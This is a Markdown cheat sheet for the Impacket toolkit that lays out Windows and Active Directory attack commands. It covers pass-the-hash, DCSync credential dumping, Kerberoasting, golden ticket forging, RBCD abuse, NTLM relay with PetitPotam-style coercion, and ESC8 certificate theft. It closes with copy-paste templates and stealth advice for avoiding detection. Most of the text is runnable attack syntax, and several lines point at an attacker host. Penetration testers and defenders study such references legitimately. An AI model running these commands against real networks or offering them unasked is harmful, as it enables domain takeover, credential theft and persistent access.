# Impacket Toolkit Reference

Complete reference for the Impacket Python toolkit covering credential extraction, remote execution, SMB operations, Kerberos attacks, lateral movement, and information gathering for Windows post-exploitation.

---

## Installation and Setup

### Installation
```bash
# Recommended: pipx for an isolated env (project now lives under fortra)
pipx install impacket
# or
pip3 install impacket
# from source (latest)
git clone https://github.com/fortra/impacket.git
cd impacket && pip3 install .
```
Binaries are exposed both as `impacket-<tool>` (Kali) and `<tool>.py`. This file uses `impacket-<tool>`.

### Authentication Formats (apply to nearly every tool)
```bash
# Username/Password
DOMAIN/username:password@target

# NTLM Hash (Pass-the-Hash) — LM:NT, use 0s for empty LM
-hashes :NTLM_HASH DOMAIN/username@target
-hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH DOMAIN/username@target

# Kerberos (ccache in KRB5CCNAME) — Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
-k -no-pass DOMAIN/username@target
-k DOMAIN/username:password@target.fqdn   # request TGT inline; use FQDN, not IP

# AES key (Pass-the-Key / Overpass-the-Hash)
-aesKey <AES256_KEY> DOMAIN/username@target

# Targeting tips that bite everyone:
#  * Kerberos (-k) requires the target FQDN (not IP) and correct DNS/hosts + clock sync.
#  * Add the DC to /etc/hosts and run `ntpdate <DC>` or `faketime` to fix clock skew.
```

---

## Remote Execution Tools

### Tool Comparison

| Tool | Method | Stealth | Use Case |
|------|--------|---------|----------|
| psexec.py | SMB + Service | Low | Standard execution |
| wmiexec.py | WMI | Medium | Semi-interactive shell |
| dcomexec.py | DCOM | High | Stealthy execution |
| atexec.py | Task Scheduler | Medium | Scheduled execution |
| smbexec.py | SMB | Medium | SMB-based execution |

### psexec.py
```bash
# Basic execution
impacket-psexec DOMAIN/username:password@<TARGET_IP>

# With hash
impacket-psexec -hashes :<NTLM_HASH> DOMAIN/username@<TARGET_IP>

# Execute specific command
impacket-psexec DOMAIN/username:password@<TARGET_IP> cmd.exe

# Upload and execute
impacket-psexec DOMAIN/username:password@<TARGET_IP> -file payload.exe
```

### wmiexec.py
```bash
# WMI-based execution
impacket-wmiexec DOMAIN/username:password@<TARGET_IP>

# PowerShell shell
impacket-wmiexec -shell-type powershell DOMAIN/username:password@<TARGET_IP>

# Single command
impacket-wmiexec DOMAIN/username:password@<TARGET_IP> "whoami"
```

### dcomexec.py
```bash
# DCOM-based execution (stealthiest)
impacket-dcomexec DOMAIN/username:password@<TARGET_IP>

# Specific DCOM object (MMC20, ShellWindows, ShellBrowserWindow)
impacket-dcomexec -object MMC20 DOMAIN/username:password@<TARGET_IP>
```

### atexec.py
```bash
# Task Scheduler execution
impacket-atexec DOMAIN/username:password@<TARGET_IP> "whoami"

# With hash
impacket-atexec -hashes :<NTLM_HASH> DOMAIN/username@<TARGET_IP> "cmd /c dir"
```

### smbexec.py
```bash
impacket-smbexec DOMAIN/username:password@<TARGET_IP>
impacket-smbexec -hashes :NTLM_HASH DOMAIN/username@<TARGET_IP>
```

---

## Credential Extraction

### secretsdump.py
```bash
# Local SAM/SYSTEM/SECURITY dump (LSA secrets, cached domain creds, machine acct)
impacket-secretsdump -sam sam -system system -security security LOCAL

# Remote: SAM + LSA secrets + cached creds (needs local admin on target)
impacket-secretsdump DOMAIN/username:password@<TARGET_IP>
impacket-secretsdump -hashes :<NTLM_HASH> DOMAIN/username@<TARGET_IP>
impacket-secretsdump -k -no-pass DOMAIN/username@<TARGET_FQDN>

# DCSync — pull all domain hashes (needs DA, or any principal with
# DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on the domain)
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-ntlm            # NTLM only (faster)
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-user krbtgt     # for golden ticket
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-user Administrator
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc -history        # include password history
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc -pwd-last-set   # show pwd age (find stale)

# Offline from a stolen NTDS.dit (e.g. via SeBackup / vssadmin / ntdsutil dump)
impacket-secretsdump -ntds ntds.dit -system system LOCAL
impacket-secretsdump -ntds ntds.dit -system system -security security LOCAL

# Use -outputfile to split results into .sam/.secrets/.ntds files for cracking
impacket-secretsdump DOMAIN/u:p@<DC_IP> -just-dc -outputfile dcdump
# dcdump.ntds -> feed NT hashes to hashcat -m 1000
```

### dpapi.py
```bash
# DPAPI blob decryption
impacket-dpapi masterkey -file masterkey_file -sid S-1-5-21-... -password password

# Chrome credential extraction
impacket-dpapi chrome -file "Login Data" -key masterkey
```

---

## SMB Operations

### smbserver.py (File Sharing)
```bash
# Basic SMB server
impacket-smbserver share_name /path/to/share

# With authentication and SMB2 support
impacket-smbserver -smb2support share_name /path/to/share -username user -password pass

# On specific interface
impacket-smbserver -ip 192.168.1.100 share_name /path/to/share
```
```cmd
# Windows connection
net use Z: \\<ATTACKER_IP>\share_name /user:user pass
```

### smbclient.py
```bash
# List shares
impacket-smbclient DOMAIN/username:password@<TARGET_IP>

# Connect to specific share
impacket-smbclient DOMAIN/username:password@<TARGET_IP> -share C$

# Download file
impacket-smbclient DOMAIN/username:password@<TARGET_IP> -share C$ -file "Windows/System32/config/SAM"
```

---

## Kerberos Attacks

### ASREPRoast (GetNPUsers.py)
```bash
# User list (no credentials needed)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# With credentials
impacket-GetNPUsers DOMAIN/username:password -request -format hashcat -outputfile asrep.txt

# Target specific user
impacket-GetNPUsers DOMAIN/username:password -request -target-user victim_user

# Crack hashes
hashcat -m 18200 asrep.txt wordlist.txt
```

### Kerberoasting (GetUserSPNs.py)
```bash
# Request all SPNs
impacket-GetUserSPNs DOMAIN/username:password -request -format hashcat -outputfile kerberoast.txt

# Request all
impacket-GetUserSPNs DOMAIN/username:password -request-all

# Target specific SPN
impacket-GetUserSPNs DOMAIN/username:password -request-target SERVICE/target

# Crack hashes
hashcat -m 13100 kerberoast.txt wordlist.txt
```

### Ticket Operations

**Request TGT (getTGT.py)**
```bash
impacket-getTGT DOMAIN/username:password
impacket-getTGT -hashes :NTLM_HASH DOMAIN/username
impacket-getTGT DOMAIN/username:password -outputfile ticket.ccache
```

**Request Service Ticket (getST.py)**
```bash
impacket-getST -spn SERVICE/target DOMAIN/username:password

# With TGT
impacket-getST -spn SERVICE/target -k -no-pass DOMAIN/username

# Impersonation
impacket-getST -spn SERVICE/target -impersonate Administrator DOMAIN/username:password
```

**Use Kerberos Ticket**
```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/username@<TARGET_IP>
```

**Convert Ticket Formats**
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

### Golden and Silver Tickets

```bash
# Golden ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN username

# Silver ticket
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN -spn SERVICE/target username

# Use golden ticket
export KRB5CCNAME=username.ccache
impacket-psexec -k -no-pass DOMAIN/username@<TARGET_IP>
```

---

## Lateral Movement

### Pass-the-Hash
```bash
# PSExec
impacket-psexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET_IP>

# WMIExec
impacket-wmiexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET_IP>

# SMBExec
impacket-smbexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET_IP>
```

### Pass-the-Hash Chain
```bash
# 1. Extract hashes from compromised host
impacket-secretsdump DOMAIN/username:password@<TARGET1>

# 2. Use hash on another system
impacket-psexec -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET2>

# 3. Extract more credentials
impacket-secretsdump -hashes :<NTLM_HASH> DOMAIN/Administrator@<TARGET2>
```

---

## Information Gathering

### RPC Enumeration
```bash
impacket-rpcdump DOMAIN/username:password@<TARGET_IP>
impacket-rpcdump -port 135 <TARGET_IP>
```

### SAM Enumeration
```bash
impacket-samrdump DOMAIN/username:password@<TARGET_IP>
impacket-samrdump <TARGET_IP>    # Anonymous (if allowed)
```

### Service Management
```bash
impacket-services DOMAIN/username:password@<TARGET_IP> list
impacket-services DOMAIN/username:password@<TARGET_IP> start <service>
impacket-services DOMAIN/username:password@<TARGET_IP> stop <service>
```

### Registry Operations
```bash
# Query registry
impacket-reg DOMAIN/username:password@<TARGET_IP> query -keyName "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"

# Save registry hive
impacket-reg DOMAIN/username:password@<TARGET_IP> save -keyName "HKLM\SAM"

# Add registry key
impacket-reg DOMAIN/username:password@<TARGET_IP> add -keyName "HKLM\SOFTWARE\Test" -v TestValue -vt REG_SZ -vd "TestData"
```

### LDAP Enumeration & AD Recon
```bash
# Bulk LDAP dump (users, groups, computers, policy, trusts) to HTML/JSON/Grep
impacket-ldapdomaindump DOMAIN/username:password@<DC_IP>
impacket-ldapdomaindump -u 'DOMAIN\username' -p password <DC_IP>
# -> domain_users.html, domain_computers.html, domain_groups.grep, etc.

# Enumerate Kerberos delegation (unconstrained / constrained / RBCD) across the domain
impacket-findDelegation DOMAIN/username:password -dc-ip <DC_IP>

# windapsearch
impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> -U   # users
impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> --computers
impacket-windapsearch -d DOMAIN -u username -p password --dc-ip <DC_IP> --da  # domain admins
```

### Add Computer Account (MachineAccountQuota abuse — key for RBCD)
```bash
# Default MAQ=10 lets ANY domain user create a machine account → use as RBCD attacker principal
impacket-addcomputer DOMAIN/username:password -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP>
# Then set RBCD on a target (see rbcd.py) and getST -impersonate Administrator.
```

### RBCD Configuration (resource-based constrained delegation)
```bash
# Write msDS-AllowedToActOnBehalfOfOtherIdentity on a target you have write access to
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write DOMAIN/username:password -dc-ip <DC_IP>
impacket-rbcd -delegate-to 'TARGET$' -action read  DOMAIN/username:password   # verify
# Then abuse:
impacket-getST -spn 'cifs/TARGET.domain.local' -impersonate Administrator -dc-ip <DC_IP> 'DOMAIN/EVIL$:Passw0rd!'
```

### Change / Reset Passwords (ACL abuse, ForceChangePassword)
```bash
impacket-changepasswd DOMAIN/victim@<DC_IP> -newpass 'NewPass123!' -reset -altuser DOMAIN/attacker -altpass 'attpass'
# Also: net rpc password, or pywhisker for shadow-credential takeover (see 08-active-directory)
```

---

## NTLM Relay & Coercion (ntlmrelayx)

`ntlmrelayx.py` is the relay engine; pair it with a coercion trigger (PetitPotam/PrinterBug/DFSCoerce) or poisoning (Responder/mitm6). **You cannot relay back to the originating host** (reflection is patched); relay to a *different* target. SMB signing must be off on SMB targets; LDAP relays need signing/EPA not enforced.

```bash
# Relay to SMB and execute (target must have SMB signing disabled)
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <b64>"

# Relay to LDAP/LDAPS on a DC and DUMP the domain (read), or escalate (write)
impacket-ntlmrelayx -t ldap://<DC_IP> --dump-laps --dump-adcs    # read-only recon
impacket-ntlmrelayx -t ldaps://<DC_IP> --escalate-user lowuser   # grant DCSync rights (if writable)
impacket-ntlmrelayx -t ldaps://<DC_IP> --delegate-access         # set RBCD from a relayed machine acct

# Relay a coerced MACHINE account to LDAP and set Shadow Credentials (no cracking needed)
impacket-ntlmrelayx -t ldap://<DC_IP> --shadow-credentials --shadow-target 'dc01$'

# ESC8: relay to AD CS HTTP enrollment → obtain a cert for the relayed account (→ PKINIT → TGT)
impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# then: certipy auth -pfx <cert>.pfx  (see 08-active-directory)

# SOCKS mode: keep the relayed session alive for ad-hoc use
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```
Trigger the authentication (low-priv domain account is enough):
```bash
# PetitPotam (MS-EFSR), modern fork supports auth-bypass pipes:
python3 PetitPotam.py -u user -p pass <ATTACKER_IP> <DC_IP>
# PrinterBug (MS-RPRN):
python3 dementor.py <ATTACKER_IP> <DC_IP> -u user -p pass -d DOMAIN
# DFSCoerce (MS-DFSNM):
python3 dfscoerce.py -u user -p pass <ATTACKER_IP> <DC_IP>
# Coercer (tries 17+ methods automatically):
coercer coerce -u user -p pass -t <DC_IP> -l <ATTACKER_IP>
# NetExec built-in:  nxc smb <DC_IP> -u user -p pass -M coerce_plus
```
> For HTTP-only relay targets (AD CS web enroll, LDAP via WebDAV) coerce over HTTP: ensure the victim's **WebClient** service is running (or start it via a `searchConnector-ms`/`.library-ms` drop), which converts SMB coercion to HTTP NTLM.

### MSSQL Attacks
```bash
impacket-mssqlclient DOMAIN/username:password@<TARGET_IP>
impacket-mssqlclient DOMAIN/username:password@<TARGET_IP> -windows-auth
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
```

---

## Attack Workflows

### Initial Access to Domain Admin
```bash
# 1. ASREPRoast for initial foothold
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

# 2. Kerberoast with valid credentials
impacket-GetUserSPNs DOMAIN/user:pass -request -format hashcat -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt

# 3. DCSync with service account
impacket-secretsdump DOMAIN/service_account:pass@<DC_IP> -just-dc
```

### Golden Ticket Persistence
```bash
# 1. Get KRBTGT hash (requires Domain Admin)
impacket-secretsdump DOMAIN/username:password@<DC_IP> -just-dc-user krbtgt

# 2. Create golden ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN fake_admin

# 3. Use golden ticket
export KRB5CCNAME=fake_admin.ccache
impacket-psexec -k -no-pass DOMAIN/fake_admin@<TARGET_IP>
```

---

## Troubleshooting

### Common Issues
```bash
# Clock skew (Kerberos)
ntpdate -s <DC_IP>

# Kerberos configuration
export KRB5_CONFIG=/etc/krb5.conf

# DNS resolution
echo "<DC_IP> domain.local" >> /etc/hosts

# SMB signing issues
impacket-smbclient -no-smb2support DOMAIN/user:pass@<TARGET>
```

### Performance Tips
```bash
# Increase timeout
impacket-secretsdump -timeout 30 DOMAIN/user:pass@<TARGET>

# Reduce verbosity
impacket-psexec -quiet DOMAIN/user:pass@<TARGET>

# Use SMB2
impacket-smbclient -smb2support DOMAIN/user:pass@<TARGET>
```

---

## Quick Copy-Paste Templates
```bash
# Credential extraction
impacket-secretsdump DOMAIN/USERNAME:PASSWORD@TARGET_IP

# Remote execution
impacket-wmiexec DOMAIN/USERNAME:PASSWORD@TARGET_IP

# Pass-the-hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/USERNAME@TARGET_IP

# SMB server
impacket-smbserver -smb2support share . -username user -password pass

# Kerberoasting
impacket-GetUserSPNs DOMAIN/USERNAME:PASSWORD -request -format hashcat -outputfile kerberoast.txt

# ASREPRoast
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

---

## Operational Security

### Stealth Recommendations
| Tool | Stealth Level | Notes |
|------|---------------|-------|
| dcomexec.py | High | Less monitored than PSExec |
| wmiexec.py | Medium | Common admin tool |
| psexec.py | Low | Creates obvious service |
| atexec.py | Medium | Uses Task Scheduler |

- Avoid PSExec when stealth matters (creates services)
- Use WMIExec or DCOMExec for lower profile
- Clean up created services and artifacts
- Schedule activities during business hours

---

## Resources

- Impacket (Fortra) — https://github.com/fortra/impacket
- Impacket examples reference — https://www.secureauth.com/labs/open-source-tools/impacket/
- NetExec (CrackMapExec successor) — https://github.com/Pennyw0rth/NetExec
- BloodHound CE — https://github.com/SpecterOps/BloodHound (see `08-active-directory/`)
- Certipy (AD CS / ESC8 follow-up) — https://github.com/ly4k/Certipy
- The Hacker Recipes – NTLM relay & coercion — https://www.thehacker.recipes/ad/movement/ntlm/relay
- Coercer — https://github.com/p0dalirius/Coercer
- 0xCZR – NTLM Relay Cheatsheet (2025) — https://www.0xczr.com/tools/NTLM_Relay_Cheatsheet/
